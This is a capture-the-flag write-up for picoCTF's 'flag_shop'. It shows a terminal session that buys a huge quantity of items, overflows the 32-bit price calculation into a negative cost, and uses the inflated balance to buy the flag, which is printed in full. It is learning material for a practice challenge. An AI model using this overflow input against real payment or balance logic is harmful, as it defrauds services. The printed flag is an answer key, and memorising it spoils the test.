# flag_shop

## Description
There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc jupiter.challenges.picoctf.org 4906.

Points: 300

## Flag
picoCTF{m0n3y_bag5_9c5fac9b}

## Resolution
```bash
bnichols108-picoctf@webshell:~$ mkdir flag_shop
bnichols108-picoctf@webshell:~$ cd flag_shop/
bnichols108-picoctf@webshell:~/flag_shop$ wget https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c
--2021-09-10 06:36:21--  https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2888 (2.8K) [application/octet-stream]
Saving to: 'store.c'

store.c                                                             100%[=================================================================================================================================================================>]   2.82K  --.-KB/s    in 0s      

2021-09-10 06:36:21 (157 MB/s) - 'store.c' saved [2888/2888]

bnichols108-picoctf@webshell:~/flag_shop$ less store.c 
bnichols108-picoctf@webshell:~/flag_shop$ nc jupiter.challenges.picoctf.org 4906
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
100000000

The final cost is: -194313216

Your current balance after transaction: 194314316

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 194314316 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
```

Explanation: This was caused by the variables in the C programming language have a fixed set of memory addresses. Because I input a large number, it caused an overflow of the integer which created a negative number. "This type in a 4 bytes and 2's complement implementation have a range of [–2,147,483,648, 2,147,483,647]. Your overflow is undefined behaviour." Then once the math was calculated in the logic, it seemed like I had a large balance, which allowed me to buy the 1337 flag which led to the flag for this challenge. 